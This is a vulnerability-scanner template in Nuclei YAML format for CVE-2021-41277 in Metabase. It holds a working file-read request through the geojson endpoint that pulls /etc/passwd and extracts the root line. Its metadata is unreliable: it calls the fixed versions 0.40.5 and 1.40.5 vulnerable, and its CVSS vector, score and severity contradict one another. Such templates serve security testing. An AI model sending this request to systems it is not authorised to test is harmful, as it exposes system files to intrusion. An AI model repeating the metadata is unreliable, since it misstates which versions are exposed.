id: metabase-arbitrary-file-read
info:
  name: Metabase Arbitrary File Read (CVE-2021-41277)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Metabase versions 0.40.5 and 1.40.5 have an arbitrary file read vulnerability
    that allows attackers to read sensitive files, potentially compromising the system.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41277
  classification:
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    cvss-score: 7.5
    cve-id: CVE-2021-41277
    cwe-id: CWE-200

variables:
  file_path: "/etc/passwd"

http:
  - raw:
      - |
        GET /api/geojson?url=file:{{file_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

    extractors:
      - type: regex
        part: body
        regex:
          - "(root:.*:0:0:.*)"
